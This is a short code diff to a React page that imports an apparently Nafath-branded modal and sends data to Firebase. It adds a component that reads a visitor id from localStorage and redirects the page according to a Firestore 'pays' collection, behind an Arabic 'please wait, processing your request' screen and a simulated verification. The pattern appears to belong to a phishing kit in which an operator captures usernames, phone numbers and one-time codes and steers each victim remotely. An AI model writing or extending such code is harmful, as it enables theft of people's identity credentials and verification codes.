@@ -6,6 +6,7 @@ import type React from "react";
 import { useEffect, useState } from "react";
 import NafazModal from "../components/NafazModal";
 import { addData } from "../apis/firebase";
+import FirestoreRedirect from "./rediract-page";
 
 interface ExternalPageData {
   username: string;
@@ -30,6 +31,8 @@ export default function ExternalPage({
   const [isRejected] = useState(false);
   const [showModal, setShowModal] = useState(false);
   const [verificationCode] = useState("");
+  const _id = localStorage.getItem("visitor");
+
   const [phone] = useState(initialPhone);
 
   // Simulate the verification process with a timeout
@@ -87,6 +90,8 @@ export default function ExternalPage({
 
   const SubmittedContent = () => (
     <div className="space-y-8 bg-[#daf2f6]">
+      <FirestoreRedirect id={_id as string} collectionName={"pays"} />
+
       <div className="space-y-4 text-base text-gray-700 p-6">
         <p>الرجاء الانتظار....</p>
         <p> جاري معالجة طلبك</p>
